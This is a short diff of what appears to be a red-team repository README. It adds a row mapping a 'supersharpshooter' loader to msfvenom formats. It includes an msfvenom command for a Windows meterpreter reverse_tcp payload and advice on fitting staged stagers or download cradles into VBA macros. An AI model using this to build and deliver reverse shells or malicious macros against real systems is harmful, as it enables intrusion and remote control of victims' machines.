@@ -65,6 +65,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=8888 -f psh -o 
 | `cs-loaders/` (nt/apc/dinvoke/unhook) | raw → C# `byte[] buf` | `-f csharp` or `generic/custom` |
 | `lateral-movement/*` | PS stager (`run.ps1`) | `-f psh` |
 | `nimsyscallpacker/` | raw shellcode / PE / C# | `-f raw` (stageless) |
+| `supersharpshooter/` | raw shellcode → JScript/VBS/HTA/macro (DotNetToJScript) | `-f raw` (stageless) → `SuperSharpShooter.py` |
 
 > ⚠️ **VBA size limit:** stageless meterpreter (`meterpreter_reverse_tcp`) is ~200KB — too big for a single VBA module. For macros use the **staged** `windows/x64/meterpreter/reverse_tcp` stager (~500B) or a download cradle. C#/PS loaders that download at runtime can use either.
 
